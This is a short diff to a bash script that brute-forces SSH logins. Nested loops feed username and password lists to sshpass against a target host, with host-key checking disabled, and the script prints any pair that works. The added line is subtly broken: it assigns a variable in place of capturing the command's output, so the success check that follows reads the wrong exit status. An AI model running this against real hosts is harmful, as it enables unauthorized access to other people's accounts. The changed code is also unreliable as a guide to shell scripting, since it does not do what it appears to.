@@ -13,7 +13,8 @@ while IFS= read -r line
 do
     while IFS= read -r line2
     do
-        sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
+        test=sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
+        echo $test
         if [ $? -eq 0 ]; then
             echo "found user: $line and password: $line2"
             break
